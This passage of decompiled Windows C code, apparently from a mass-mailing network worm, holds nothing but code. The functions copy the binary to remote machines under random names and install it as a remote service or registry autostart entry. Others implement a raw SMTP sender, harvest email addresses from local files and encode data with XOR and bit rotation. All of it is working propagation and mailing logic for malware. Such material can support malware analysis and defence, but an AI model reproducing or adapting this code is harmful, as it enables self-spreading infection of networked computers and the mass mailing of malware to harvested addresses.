      if ( EqualSid(pSid1, pSid2) )
        break;
      ++v18;
      v6 += 2;
      if ( v18 >= *(_DWORD *)hMem )
        goto LABEL_20;
    }
    *a1 = 1;
    v11 = 0;
  }
LABEL_20:
  if ( !*a1 && !v11 )
    *a1 = 1;
LABEL_23:
  if ( pSid2 )
    FreeSid(pSid2);
  if ( pSid )
    FreeSid(pSid);
  if ( hMem )
    LocalFree(hMem);
  if ( TokenHandle )
    CloseHandle(TokenHandle);
  if ( hObject )
    CloseHandle(hObject);
  return v17;
}

//----- (0040284D) --------------------------------------------------------
int __cdecl sub_40284D(LPCSTR lpMachineName, char *Source, SC_HANDLE hSCObject, HKEY phkResult, int started, int a6)
{
  int v6; // eax
  int v7; // eax
  size_t v8; // eax
  bool v9; // zf
  char *v10; // eax
  int v11; // eax
  SC_HANDLE v12; // edi
  SC_HANDLE v13; // esi
  char Str[8828]; // [esp+Ch] [ebp-2DE0h] BYREF
  WCHAR v16[260]; // [esp+2288h] [ebp-B64h] BYREF
  WCHAR WideCharStr[260]; // [esp+2490h] [ebp-95Ch] BYREF
  CHAR SubKey[200]; // [esp+2698h] [ebp-754h] BYREF
  char Filename[260]; // [esp+2760h] [ebp-68Ch] BYREF
  CHAR ExistingFileName[260]; // [esp+2864h] [ebp-588h] BYREF
  CHAR MultiByteStr[500]; // [esp+2968h] [ebp-484h] BYREF
  char Destination[260]; // [esp+2B5Ch] [ebp-290h] BYREF
  CHAR NewFileName[260]; // [esp+2C60h] [ebp-18Ch] BYREF
  CHAR ServiceName[100]; // [esp+2D64h] [ebp-88h] BYREF
  CHAR Buffer[32]; // [esp+2DC8h] [ebp-24h] BYREF
  DWORD nSize; // [esp+2DE8h] [ebp-4h] BYREF

  nSize = 32;
  ServiceName[0] = 0;
  if ( hSCObject )
    strcpy(ServiceName, (const char *)hSCObject);
  else
    sub_40372F(ServiceName, 5, 10, 7);
  if ( started )
    strcpy(ExistingFileName, (const char *)started);
  else
    strcpy(ExistingFileName, (const char *)&ApplicationName);
  strcpy(NewFileName, lpMachineName);
  strcat(NewFileName, Source);
  if ( phkResult )
  {
    strcpy(Destination, (const char *)phkResult);
  }
  else
  {
    v6 = rand();
    sub_404261(Destination, v6 % 2, &byte_4101DC, 1);
  }
  if ( dword_4938F0 )
  {
    v7 = rand();
    sub_404261(Destination, v7 % 2, 0, 1);
  }
  v8 = strlen(NewFileName);
  v9 = Destination[v8 + 259] == 92;
  v10 = &Destination[v8 + 259];
  if ( v9 )
    *v10 = 0;
  if ( Destination[0] != 92 )
    strcat(NewFileName, asc_40F044);
  strcat(NewFileName, Destination);
  if ( !CopyFileA(ExistingFileName, NewFileName, 0) )
    return 0;
  if ( rand() % 5 )
  {
    v11 = rand();
    sub_40406E(NewFileName, v11 % 10240 + 86144);
  }
  memcpy(Str, &String1, 0x227Au);
  Str[4116] = 0;
  sub_405705(NewFileName, Str);
  sub_405522(NewFileName);
  if ( dword_4938F0 )
    return 0;
  GetComputerNameA(Buffer, &nSize);
  if ( !_strcmpi(lpMachineName + 2, Buffer) )
    return 0;
  v12 = OpenSCManagerA(lpMachineName, 0, 2u);
  if ( !v12 && !a6 )
    return 0;
  CreateServiceA(v12, ServiceName, ServiceName, 0, 0x110u, 3u, 0, NewFileName, 0, 0, 0, 0, 0);
  CloseServiceHandle(v12);
  v13 = OpenSCManagerA(lpMachineName, 0, 1u);
  hSCObject = OpenServiceA(v13, ServiceName, 0x10u);
  started = StartServiceA(hSCObject, 0, 0);
  CloseServiceHandle(hSCObject);
  CloseServiceHandle(v13);
  if ( !started )
  {
    memset(WideCharStr, 0, sizeof(WideCharStr));
    memset(v16, 0, sizeof(v16));
    hSCObject = 0;
    started = 0;
    if ( !dword_493904 )
      return 0;
    if ( *Source == 92 )
      started = 1;
    MultiByteToWideChar(0, 1u, lpMachineName, -1, WideCharStr, 260);
    MultiByteToWideChar(0, 1u, &Source[started], -1, v16, 260);
    if ( !dword_493904(WideCharStr, v16, 2, &hSCObject) )
    {
      MultiByteStr[0] = 0;
      WideCharToMultiByte(0, 0, *((LPCWCH *)hSCObject + 6), -1, MultiByteStr, 260, 0, 0);
      if ( !RegConnectRegistryA(lpMachineName, HKEY_LOCAL_MACHINE, &phkResult) )
      {
        sub_403CE3(SubKey, 3);
        strcat(MultiByteStr, asc_40F044);
        strcat(MultiByteStr, Destination);
        Filename[0] = 0;
        _splitpath(MultiByteStr, 0, 0, Filename, 0);
        sub_40464B(phkResult, SubKey, Filename, (BYTE *)MultiByteStr);
        RegCloseKey(phkResult);
      }
      if ( dword_49390C )
        dword_49390C(hSCObject);
    }
  }
  return 1;
}
// 4938F0: using guessed type int dword_4938F0;
// 493904: using guessed type int (__stdcall *dword_493904)(_DWORD, _DWORD, _DWORD, _DWORD);
// 49390C: using guessed type int (__stdcall *dword_49390C)(_DWORD);

//----- (00402C3B) --------------------------------------------------------
int __thiscall sub_402C3B(void *this, char *Source, int a3, size_t Size, int a5)
{
  void *v6; // eax
  void *v7; // eax
  void *v9; // [esp-Ch] [ebp-18h]

  *((_DWORD *)this + 6) = a5;
  *(_DWORD *)this = 0;
  *((_DWORD *)this + 3) = 0;
  strcpy((char *)this + 28, Source);
  *((_WORD *)this + 206) = a3;
  *((_WORD *)this + 207) = 25;
  v6 = operator new(Size);
  *((_DWORD *)this + 1) = v6;
  if ( !v6 || (v7 = operator new(Size), (*((_DWORD *)this + 4) = v7) == 0) )
  {
    *((_DWORD *)this + 105) = -2147483646;
    return 0;
  }
  v9 = (void *)*((_DWORD *)this + 1);
  *((_DWORD *)this + 2) = Size;
  *((_DWORD *)this + 5) = Size;
  memset(v9, 0, Size);
  memset(*((void **)this + 4), 0, Size);
  *((_DWORD *)this + 105) = 0;
  *((_DWORD *)this + 106) = 0;
  *((_DWORD *)this + 107) = 0;
  *((_BYTE *)this + 284) = 0;
  if ( !sub_403222((SOCKET *)this + 104, a3, 1, 1) )
  {
    *((_DWORD *)this + 105) = -2147483643;
    return 0;
  }
  if ( *((_DWORD *)this + 3) && *(_DWORD *)this )
    return 1;
  else
    return 2;
}

//----- (00402D0D) --------------------------------------------------------
int __thiscall sub_402D0D(int this)
{
  SOCKET *v2; // edi
  int v3; // eax
  int v4; // esi

  if ( *(_DWORD *)(this + 4) )
    operator delete(*(void **)(this + 4));
  if ( *(_DWORD *)(this + 16) )
    operator delete(*(void **)(this + 16));
  v2 = (SOCKET *)(this + 416);
  sub_4032CF((SOCKET *)(this + 416), buf, 6, 0);
  do
    v3 = sub_40330B();
  while ( !v3 );
  if ( v3 == 1 )
    v4 = sub_403034((SOCKET *)this, 0xDDu);
  else
    v4 = 1;
  sub_4032FD(v2);
  return v4;
}

//----- (00402D72) --------------------------------------------------------
int __thiscall sub_402D72(int this)
{
  int result; // eax
  int v3; // eax

  if ( sub_40326C((SOCKET *)(this + 416), (char *)(this + 28), *(_WORD *)(this + 412)) )
  {
    do
      v3 = sub_40330B();
    while ( !v3 );
    if ( v3 == 1 )
    {
      return sub_403034((SOCKET *)this, 0xDCu);
    }
    else
    {
      *(_DWORD *)(this + 420) = -2147483645;
      return 1;
    }
  }
  else
  {
    result = -2147483647;
    *(_DWORD *)(this + 420) = -2147483647;
  }
  return result;
}

//----- (00402DCE) --------------------------------------------------------
int __thiscall sub_402DCE(int this, char *buf, int len)
{
  int v4; // eax
  int v5; // eax
  int result; // eax
  char *v7; // edi
  size_t v8; // eax
  char Str[256]; // [esp+Ch] [ebp-104h] BYREF
  unsigned int v10; // [esp+10Ch] [ebp-4h]

  sprintf(Str, "HELO %s\r\n", (const char *)(this + 284));
  v4 = strlen(Str);
  sub_4032CF((SOCKET *)(this + 416), Str, v4, 0);
  do
    v5 = sub_40330B();
  while ( !v5 );
  if ( v5 == 1 )
  {
    result = sub_403034((SOCKET *)this, 0xFAu);
    if ( !result )
    {
      result = sub_402EE0((SOCKET *)this);
      if ( !result )
      {
        v10 = 0;
        v7 = *(char **)(this + 4);
        if ( *(_DWORD *)this )
        {
          while ( 1 )
          {
            result = sub_402F9A((SOCKET *)this, v7);
            if ( result )
              break;
            v8 = strlen(v7);
            ++v10;
            v7 += v8 + 1;
            if ( v10 >= *(_DWORD *)this )
              goto LABEL_9;
          }
        }
        else
        {
LABEL_9:
          sub_4032CF((SOCKET *)(this + 416), aData, 7, 0);
          result = sub_403034((SOCKET *)this, 0x162u);
          if ( !result )
          {
            sub_4032CF((SOCKET *)(this + 416), buf, len, 0);
            sub_4032CF((SOCKET *)(this + 416), asc_40F050, 5, 0);
            return sub_403034((SOCKET *)this, 0xFAu);
          }
        }
      }
    }
  }
  else
  {
    *(_DWORD *)(this + 420) = -2147483645;
    return 1;
  }
  return result;
}

//----- (00402EE0) --------------------------------------------------------
int __thiscall sub_402EE0(SOCKET *this)
{
  char *v2; // eax
  char *v3; // ebx
  int result; // eax
  const char *v5; // edi
  SOCKET i; // ebp
  int v7; // eax
  int v8; // ebp

  v2 = (char *)operator new(this[5] + 100);
  v3 = v2;
  if ( !v2 )
    return 2;
  strcpy(v2, aMailFrom);
  v5 = (const char *)this[4];
  for ( i = 0; i < this[3]; v5 += strlen(v5) + 1 )
  {
    strcat(v3, v5);
    strcat(v3, asc_40F038);
    ++i;
  }
  strcat(v3, asc_40F06C);
  v7 = strlen(v3);
  sub_4032CF(this + 104, v3, v7, 0);
  do
    v8 = sub_40330B();
  while ( !v8 );
  operator delete(v3);
  result = 1;
  if ( v8 == 1 )
    return sub_403034(this, 0xFAu);
  this[105] = -2147483645;
  return result;
}

//----- (00402F9A) --------------------------------------------------------
int __thiscall sub_402F9A(SOCKET *this, char *Source)
{
  size_t v3; // eax
  char *v4; // eax
  char *v5; // esi
  int result; // eax
  int v7; // eax
  int v8; // ebp

  v3 = strlen(Source);
  v4 = (char *)operator new(v3 + 100);
  v5 = v4;
  if ( !v4 )
    return 2;
  strcpy(v4, aRcptTo);
  strcat(v5, Source);
  strcat(v5, asc_40F06C);
  v7 = strlen(v5);
  sub_4032CF(this + 104, v5, v7, 0);
  do
    v8 = sub_40330B();
  while ( !v8 );
  operator delete(v5);
  result = 1;
  if ( v8 == 1 )
    return sub_403034(this, 0xFAu);
  this[105] = -2147483645;
  return result;
}

//----- (00403034) --------------------------------------------------------
int __thiscall sub_403034(SOCKET *this, SOCKET a2)
{
  int v3; // eax
  SOCKET v4; // ecx
  char Buffer[1024]; // [esp+8h] [ebp-404h] BYREF
  SOCKET v8; // [esp+408h] [ebp-4h] BYREF

  sub_4032E6(this + 104, Buffer, 1024, 0);
  do
    v3 = sub_40330B();
  while ( !v3 );
  if ( v3 == 1 )
  {
    sscanf(Buffer, "%d", &v8);
    v4 = v8;
    if ( a2 == v8 )
      return 0;
    this[105] = -2147483644;
    this[106] = v4;
    this[107] = a2;
    return 2;
  }
  else
  {
    this[105] = -2147483645;
    return 1;
  }
}

//----- (004030BF) --------------------------------------------------------
char *__thiscall sub_4030BF(char *this, char *Source)
{
  return strcpy(this + 284, Source);
}

//----- (004030D4) --------------------------------------------------------
char *__thiscall sub_4030D4(int this, char *Source)
{
  char *v3; // edi
  size_t i; // ebx
  unsigned int v5; // eax
  char *result; // eax
  char *v7; // ebx
  int v8; // edi
  _BYTE *v9; // [esp-1Ch] [ebp-2Ch]
  size_t v10; // [esp-4h] [ebp-14h]
  unsigned int v11; // [esp+Ch] [ebp-4h]

  v3 = *(char **)(this + 16);
  v11 = 0;
  for ( i = strlen(Source); v11 < *(_DWORD *)(this + 12); v3 += strlen(v3) + 1 )
    ++v11;
  v5 = *(_DWORD *)(this + 20);
  if ( (unsigned int)&v3[i - *(_DWORD *)(this + 16)] > v5 )
  {
    v10 = *(_DWORD *)(this + 24) + v5;
    *(_DWORD *)(this + 20) = v10;
    result = (char *)operator new(v10);
    v7 = result;
    if ( !result )
    {
      *(_DWORD *)(this + 420) = -2147483646;
      return result;
    }
    memset(result, 0, *(_DWORD *)(this + 20));
    memcpy_0(v7, *(const void **)(this + 16), (size_t)&v3[-*(_DWORD *)(this + 16)]);
    v9 = *(_BYTE **)(this + 16);
    v8 = v3 - v9;
    operator delete(v9);
    *(_DWORD *)(this + 16) = v7;
    v3 = &v7[v8];
  }
  strcpy(v3, Source);
  return (char *)++*(_DWORD *)(this + 12);
}

//----- (0040317D) --------------------------------------------------------
char *__thiscall sub_40317D(void *this, char *Source)
{
  char *v3; // edi
  size_t i; // ebx
  unsigned int v5; // eax
  char *result; // eax
  char *v7; // ebx
  int v8; // edi
  _BYTE *v9; // [esp-1Ch] [ebp-2Ch]
  size_t v10; // [esp-4h] [ebp-14h]
  unsigned int v11; // [esp+Ch] [ebp-4h]

  v3 = (char *)*((_DWORD *)this + 1);
  v11 = 0;
  for ( i = strlen(Source); v11 < *(_DWORD *)this; v3 += strlen(v3) + 1 )
    ++v11;
  v5 = *((_DWORD *)this + 2);
  if ( (unsigned int)&v3[i - *((_DWORD *)this + 1)] > v5 )
  {
    v10 = *((_DWORD *)this + 6) + v5;
    *((_DWORD *)this + 2) = v10;
    result = (char *)operator new(v10);
    v7 = result;
    if ( !result )
    {
      *((_DWORD *)this + 105) = -2147483646;
      return result;
    }
    memset(result, 0, *((_DWORD *)this + 2));
    memcpy_0(v7, *((const void **)this + 1), (size_t)&v3[-*((_DWORD *)this + 1)]);
    v9 = (_BYTE *)*((_DWORD *)this + 1);
    v8 = v3 - v9;
    operator delete(v9);
    *((_DWORD *)this + 1) = v7;
    v3 = &v7[v8];
  }
  strcpy(v3, Source);
  return (char *)++*(_DWORD *)this;
}

//----- (00403222) --------------------------------------------------------
BOOL __thiscall sub_403222(SOCKET *this, int a2, __int16 a3, int a4)
{
  __int16 v4; // bx
  SOCKET v6; // eax
  struct WSAData WSAData; // [esp+8h] [ebp-190h] BYREF

  v4 = 1;
  WSAStartup(2u, &WSAData);
  if ( a3 == 2 )
    v4 = 2;
  v6 = socket(2, v4, 6);
  *this = v6;
  return v6 != -1;
}

//----- (0040326C) --------------------------------------------------------
int __thiscall sub_40326C(SOCKET *this, char *a2, int hostshort)
{
  struct sockaddr name; // [esp+4h] [ebp-10h] BYREF

  *(_WORD *)name.sa_data = htons(hostshort);
  name.sa_family = 2;
  sub_40330F(a2, (int)&hostshort);
  *(_DWORD *)&name.sa_data[2] = hostshort;
  if ( !connect(*this, &name, 16) )
    return 1;
  WSAGetLastError();
  return 0;
}

//----- (004032CF) --------------------------------------------------------
int __thiscall sub_4032CF(SOCKET *this, char *buf, int len, int flags)
{
  return send(*this, buf, len, flags);
}

//----- (004032E6) --------------------------------------------------------
int __thiscall sub_4032E6(SOCKET *this, char *buf, int len, int flags)
{
  return recv(*this, buf, len, flags);
}

//----- (004032FD) --------------------------------------------------------
int __thiscall sub_4032FD(SOCKET *this)
{
  closesocket(*this);
  return WSACleanup();
}

//----- (0040330B) --------------------------------------------------------
int sub_40330B()
{
  return 1;
}

//----- (0040330F) --------------------------------------------------------
int __stdcall sub_40330F(char *name, int a2)
{
  signed int v2; // esi
  int v3; // ebx
  char v4; // al
  struct hostent *v6; // esi
  int i; // eax
  int v8; // [esp+10h] [ebp-4h]

  v2 = 0;
  v3 = 1;
  v8 = 0;
  if ( (int)strlen(name) <= 0 )
    return 0;
  do
  {
    v4 = name[v2];
    if ( v4 == 46 )
    {
      ++v8;
    }
    else if ( v4 < 48 || v4 > 57 )
    {
      v3 = 0;
    }
    ++v2;
  }
  while ( v2 < (int)strlen(name) );
  if ( v3 )
  {
    if ( v8 != 3 )
      return 0;
    sub_4033A1((int)name, a2);
  }
  else
  {
    v6 = gethostbyname(name);
    WSAGetLastError();
    if ( v6 )
    {
      for ( i = 0; i < 4; ++i )
        *(_BYTE *)(i + a2) = (*v6->h_addr_list)[i];
    }
  }
  return 1;
}

//----- (004033A1) --------------------------------------------------------
char __stdcall sub_4033A1(int a1, int a2)
{
  int v2; // ebx
  int v3; // esi
  _BYTE *v4; // edi
  char result; // al
  int i; // [esp+Ch] [ebp-4h]

  v2 = a1;
  v3 = 0;
  for ( i = 0; i < 4; ++i )
  {
    v4 = (_BYTE *)(v3 + v2);
    sscanf((const char *const)(v3 + v2), "%d", &a1);
    result = i;
    *(_BYTE *)(i + a2) = a1;
    if ( i == 3 )
      break;
    ++v3;
    if ( *v4 != 46 )
    {
      do
      {
        result = *(_BYTE *)(v3 + v2);
        ++v3;
      }
      while ( result != 46 );
    }
  }
  return result;
}

//----- (004033F4) --------------------------------------------------------
int __cdecl sub_4033F4(char *Destination, char *Source, int a3, int a4)
{
  char *v4; // esi
  size_t v5; // edi
  size_t v7; // [esp+Ch] [ebp-4h]

  v4 = Destination;
  v7 = strlen(Source);
  while ( 1 )
  {
    v5 = strlen(v4);
    if ( !v5 || a3 && v4 - Destination >= a3 )
      break;
    if ( a4 && !_strcmpi(v4, Source) )
      return -1;
    v4 += v5 + 1;
  }
  if ( (int)(v4 - Destination + v7 + 2) > a3 && a3 )
    return 0;
  strcpy(v4, Source);
  v4[strlen(v4) + 1] = 0;
  return 1;
}

//----- (0040347E) --------------------------------------------------------
char *__cdecl sub_40347E(char *Str, int a2)
{
  int i; // edi

  for ( i = 0; i < a2; Str += strlen(Str) + 1 )
  {
    if ( !strlen(Str) )
      break;
    ++i;
  }
  return Str;
}

//----- (004034AE) --------------------------------------------------------
int __cdecl sub_4034AE(char *Str, int a2)
{
  char *v2; // esi
  int i; // edi
  size_t v4; // eax

  v2 = Str;
  for ( i = 0; ; ++i )
  {
    v4 = strlen(v2);
    if ( !v4 || a2 && v2 - Str >= a2 )
      break;
    v2 += v4 + 1;
  }
  return i;
}

//----- (004034E0) --------------------------------------------------------
int __cdecl sub_4034E0(char *Str, char *Destination, int a3)
{
  int v3; // edi
  size_t v5; // esi
  char *v6; // eax
  int v7; // esi
  char *v8; // eax
  int v9; // esi
  int v10; // edi
  char *v11; // eax
  size_t v12; // [esp-10h] [ebp-20h]
  char *v13; // [esp+Ch] [ebp-4h]
  char *Destinationa; // [esp+1Ch] [ebp+Ch]

  v13 = Destination;
  v3 = sub_4034AE(Str, 0);
  if ( v3 <= 0 )
    return 0;
  if ( (int)Destination < 0 )
    v13 = (char *)(sub_4047B6(0) % (unsigned int)v3);
  v5 = 2 * (sub_40347E(Str, v3 + 2) - Str);
  v6 = (char *)operator new(v5);
  v12 = v5;
  v7 = 0;
  Destinationa = v6;
  memset(v6, 0, v12);
  do
  {
    if ( (char *)v7 != v13 )
    {
      v8 = sub_40347E(Str, v7);
      sub_4033F4(Destinationa, v8, a3, 1);
    }
    ++v7;
  }
  while ( v7 < v3 );
  v9 = 0;
  v10 = v3 - 1;
  *(_DWORD *)Str = 0;
  if ( v10 > 0 )
  {
    do
    {
      v11 = sub_40347E(Destinationa, v9);
      sub_4033F4(Str, v11, a3, 1);
      ++v9;
    }
    while ( v9 < v10 );
  }
  operator delete(Destinationa);
  return 1;
}
// 403542: conditional instruction was optimized away because edi.4>=1

//----- (004035A1) --------------------------------------------------------
_BYTE *__cdecl sub_4035A1(int a1)
{
  int i; // edi
  unsigned int v2; // edx
  _BYTE *result; // eax

  for ( i = 0; i < 4; ++i )
  {
    v2 = sub_4047B6(0) % (unsigned int)(i != 0 ? 256 : 8);
    result = (_BYTE *)(i + a1);
    *(_BYTE *)(i + a1) = v2;
    if ( !(_BYTE)v2 )
      *result = 1;
  }
  return result;
}

//----- (004035D8) --------------------------------------------------------
int __cdecl sub_4035D8(int a1, int a2, char *a3)
{
  char v3; // al
  _BYTE *v5; // [esp+Ch] [ebp-Ch]
  int v6; // [esp+10h] [ebp-8h]
  char v7; // [esp+16h] [ebp-2h]
  char i; // [esp+17h] [ebp-1h]

  v6 = 0;
  v7 = *a3;
  for ( i = a3[1]; v6 < a2; *v5 = i ^ __ROL1__(v3, v7) )
  {
    v5 = (_BYTE *)(v6 + a1);
    v3 = *(_BYTE *)(v6 + a1);
    ++v6;
  }
  return 1;
}

//----- (00403634) --------------------------------------------------------
int __cdecl sub_403634(int a1, int a2, char *a3)
{
  char v3; // al
  _BYTE *v5; // [esp+Ch] [ebp-Ch]
  int v6; // [esp+10h] [ebp-8h]
  char v7; // [esp+16h] [ebp-2h]
  char i; // [esp+17h] [ebp-1h]

  v6 = 0;
  v7 = *a3;
  for ( i = a3[1]; v6 < a2; *v5 = __ROR1__(i ^ v3, v7) )
  {
    v5 = (_BYTE *)(v6 + a1);
    v3 = *(_BYTE *)(v6 + a1);
    ++v6;
  }
  return 1;
}

//----- (00403690) --------------------------------------------------------
unsigned int __cdecl sub_403690(int a1)
{
  unsigned int v1; // esi

  v1 = sub_4047B6(0) % 0x1Au + 97;
  if ( a1 != 4 )
  {
    if ( a1 == 1 )
      return sub_4047B6(0) % 0xAu + 48;
    if ( (a1 & 2) != 0 )
      v1 = sub_4047B6(0) % 0x1Au + 65;
    if ( (sub_4047B6(0) & 1) != 0 && (a1 & 4) != 0 )
      v1 = sub_4047B6(0) % 0x1Au + 97;
    if ( (sub_4047B6(0) & 1) != 0 && (a1 & 1) != 0 )
      return sub_4047B6(0) % 0xAu + 48;
  }
  return v1;
}

//----- (0040372F) --------------------------------------------------------
int __cdecl sub_40372F(_BYTE *a1, int a2, int a3, int a4)
{
  int v4; // esi
  int i; // edi

  v4 = a2;
  if ( a3 > a2 )
    v4 = a2 + sub_4047B6(0) % (unsigned int)(a3 - a2);
  for ( i = 0; i < v4; ++i )
    a1[i] = sub_403690(a4);
  *a1 = sub_403690(2);
  a1[i] = 0;
  return 1;
}

//----- (00403783) --------------------------------------------------------
int __cdecl sub_403783(char a1)
{
  int v1; // esi

  v1 = 0;
  if ( (int)strlen(asc_40F090) <= 0 )
    return 0;
  while ( a1 != asc_40F090[v1] )
  {
    if ( ++v1 >= (int)strlen(asc_40F090) )
      return 0;
  }
  return 1;
}

//----- (004037B9) --------------------------------------------------------
int __cdecl sub_4037B9(char a1)
{
  int v1; // esi

  if ( a1 < 0 )
    return 0;
  if ( !isalpha(a1) && !isdigit(a1) )
  {
    v1 = 0;
    if ( (int)strlen(asc_40F098) > 0 )
    {
      while ( a1 != asc_40F098[v1] )
      {
        if ( ++v1 >= (int)strlen(asc_40F098) )
          return 0;
      }
      return 1;
    }
    return 0;
  }
  return 1;
}

//----- (0040380E) --------------------------------------------------------
BOOL __cdecl sub_40380E(BYTE *a1)
{
  return IsDBCSLeadByte(*a1) && a1[1] > 0x80u;
}

//----- (0040382F) --------------------------------------------------------
BOOL __cdecl sub_40382F(_BYTE *a1)
{
  return *a1 == 0xA1 || *a1 == 0xA3;
}

//----- (00403844) --------------------------------------------------------
int __cdecl sub_403844(int a1, char *a2, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // esi
  int v10; // ebx
  int v11; // ecx
  char v12; // al
  int v13; // ebx
  int v14; // ebx
  int v15; // ebx
  char Destination[2040]; // [esp+Ch] [ebp-7FCh] BYREF
  int v17; // [esp+804h] [ebp-4h]
  char *i; // [esp+814h] [ebp+Ch]
  char *v19; // [esp+814h] [ebp+Ch]
  BYTE *v20; // [esp+818h] [ebp+10h]
  int v21; // [esp+828h] [ebp+20h]

  v8 = 0;
  v17 = 0;
  *a2 = 0;
  *(_DWORD *)a6 = 0;
  if ( a3 <= 0 )
    return a1 + 1;
  v10 = a1;
  if ( !sub_4037B9(*(_BYTE *)a1) )
  {
    for ( i = (char *)a1; v8 < a3 - 1 && !sub_4037B9(*i); ++i )
    {
      if ( a7 )
      {
        if ( sub_40380E((BYTE *)i) && !sub_40382F(i) )
          break;
        if ( sub_40382F(i) )
        {
          ++v8;
          ++i;
        }
      }
      ++v8;
    }
  }
  v19 = (char *)(a3 - 1);
  if ( v8 < a3 - 1 )
  {
    if ( sub_4037B9(*(_BYTE *)(v8 + a1)) )
    {
      while ( !sub_403783(*(_BYTE *)(v8 + a1)) )
      {
        if ( ++v8 >= (int)v19 )
          return v8 + v10;
      }
      do
      {
        if ( !sub_4037B9(*(_BYTE *)(v8 + a1)) )
          break;
        v11 = v17;
        v12 = *(_BYTE *)(v8 + a1);
        ++v17;
        ++v8;
        a2[v11] = v12;
        if ( v8 >= (int)v19 )
          break;
      }
      while ( v17 < a5 - 1 );
      if ( v17 >= a5 - 1 && v17 )
      {
        do
        {
          if ( sub_403783(a2[v17]) )
            break;
          --v17;
        }
        while ( v17 );
      }
      if ( v17 >= 0 )
        a2[v17] = 0;
      v13 = 0;
      if ( *a2 )
      {
        do
        {
          if ( !sub_403783(a2[v13]) )
            break;
          ++v13;
        }
        while ( a2[v13] );
      }
      strcpy(Destination, &a2[v13]);
      strcpy(a2, Destination);
      if ( v17 - v13 >= a4 )
        goto LABEL_40;
      v10 = a1;
    }
    if ( a7 )
    {
      *a2 = 0;
      v14 = 0;
      if ( sub_40380E((BYTE *)(v8 + a1)) )
      {
        v21 = a3 - 2;
        v20 = (BYTE *)(v8 + a1);
        do
        {
          if ( !sub_40382F(v20) )
          {
            a2[v14] = *v20;
            v15 = v14 + 1;
            a2[v15] = v20[1];
            v14 = v15 + 1;
          }
          v8 += 2;
          v20 += 2;
        }
        while ( v8 < v21 && v14 < a5 - 2 && sub_40380E(v20) );
      }
      a2[v14] = 0;
      if ( v14 >= a4 )
      {
LABEL_40:
        *(_DWORD *)a6 = 1;
        return v8 + a1;
      }
      v10 = a1;
    }
    *(_DWORD *)a6 = 0;
  }
  return v8 + v10;
}

//----- (00403A4F) --------------------------------------------------------
BOOL __cdecl sub_403A4F(LPCSTR lpFileName, char *Destination, int a3, int a4, int a5)
{
  LPVOID v5; // eax
  int v6; // esi
  int v7; // edx
  int v8; // ecx
  int i; // edi
  unsigned int v10; // eax
  int v11; // edi
  char Source[4096]; // [esp+Ch] [ebp-101Ch] BYREF
  char v14[16]; // [esp+100Ch] [ebp-1Ch] BYREF
  int j; // [esp+101Ch] [ebp-Ch]
  int v16; // [esp+1020h] [ebp-8h] BYREF
  int v17; // [esp+1024h] [ebp-4h] BYREF
  int lpFileNamea; // [esp+1030h] [ebp+8h]

  sub_40174B(v14);
  *Destination = 0;
  v5 = sub_40174E((int)v14, lpFileName, (int)&v16, 1);
  v6 = (int)v5;
  if ( !v5 )
    return 0;
  v7 = v16;
  if ( (unsigned int)v16 < 0xA )
  {
LABEL_21:
    sub_401808((int)v14);
    return 0;
  }
  Source[0] = 0;
  v17 = 0;
  do
  {
    v5 = (LPVOID)sub_403844((int)v5, Destination, v7, a3, a4, (int)&v17, a5);
    v8 = v16;
    v7 = v6 + v16 - (_DWORD)v5;
    if ( v7 <= 5 )
    {
      *Destination = 0;
      goto LABEL_21;
    }
  }
  while ( !v17 );
  lpFileNamea = 0;
  for ( i = 0; i < 10000; ++i )
  {
    v5 = (LPVOID)sub_403844((int)v5, Source, v6 + v8 - (_DWORD)v5, a3, a4, (int)&v17, a5);
    if ( v17 )
      ++lpFileNamea;
    v8 = v16;
    if ( (unsigned int)(v6 + v16 - (_DWORD)v5) <= 5 )
      break;
  }
  if ( lpFileNamea )
  {
    v10 = sub_4047B6(0);
    v8 = v16;
    lpFileNamea = v10 % i;
  }
  v11 = v6;
  for ( j = 0; j < 10000; ++j )
  {
    v11 = sub_403844(v11, Source, v6 + v8 - v11, a3, a4, (int)&v17, a5);
    if ( v17 )
    {
      if ( !lpFileNamea )
        break;
      --lpFileNamea;
      strcpy(Destination, Source);
    }
    v8 = v16;
    if ( (unsigned int)(v6 + v16 - v11) <= 5 )
      break;
  }
  sub_401808((int)v14);
  return (int)strlen(Destination) >= a3;
}

//----- (00403BB8) --------------------------------------------------------
int __cdecl sub_403BB8(int a1, int a2, char *Destination)
{
  int v3; // ebx
  _BYTE *v4; // eax

  v3 = 0;
  if ( a2 )
    *(_BYTE *)a2 = 0;
  if ( Destination )
    *Destination = 0;
  if ( *(_BYTE *)a1 != 64 )
  {
    v4 = (_BYTE *)a1;
    do
    {
      if ( !*v4 )
        break;
      if ( a2 )
        v4[a2 - a1] = *v4;
      ++v3;
      ++v4;
    }
    while ( *v4 != 64 );
  }
  if ( a2 )
    *(_BYTE *)(v3 + a2) = 0;
  if ( !*(_BYTE *)(v3 + a1) )
    return 0;
  if ( Destination )
    strcpy(Destination, (const char *)(v3 + a1));
  return 1;
}

//----- (00403C23) --------------------------------------------------------
int __cdecl sub_403C23(char a1)
{
  int v1; // eax
  char v3[4]; // [esp+Ch] [ebp-4h] BYREF

  strcpy(v3, "-_");
  if ( a1 <= 32 || a1 >= 126 )
    return 0;
  if ( !isalpha(a1) )
  {
    v1 = isdigit(a1);
    if ( !v1 && a1 != 64 && a1 != 46 )
    {
      while ( a1 != v3[v1] )
      {
        if ( ++v1 >= 2 )
          return 0;
      }
    }
  }
  return 1;
}

//----- (00403C7D) --------------------------------------------------------
int __cdecl sub_403C7D(char a1)
{
  return sub_403C23(a1);
}

//----- (00403C88) --------------------------------------------------------
char *__cdecl sub_403C88(char *Source, char *a2)
{
  char Destination[4096]; // [esp+0h] [ebp-2000h] BYREF
  char SubStr[4096]; // [esp+1000h] [ebp-1000h] BYREF

  strcpy(Destination, Source);
  strcpy(SubStr, a2);
  _strlwr(Destination);
  _strlwr(SubStr);
  return strstr(Destination, SubStr);
}

//----- (00403CE3) --------------------------------------------------------
char *__cdecl sub_403CE3(char *Destination, int a2)
{
  char *v2; // eax

  strcpy(Destination, SubKey);
  v2 = sub_40347E(SubKey, a2);
  return strcat(Destination, v2);
}

//----- (00403D0C) --------------------------------------------------------
int __cdecl sub_403D0C(char *Str)
{
  signed int v1; // eax
  signed int v2; // edi
  int v3; // esi

  v1 = strlen(Str);
  v2 = v1;
  if ( v1 >= 4 && v1 <= 12 )
  {
    v3 = 0;
    while ( isdigit(Str[v3]) )
    {
      if ( ++v3 >= v2 )
        return 1;
    }
  }
  return 0;
}
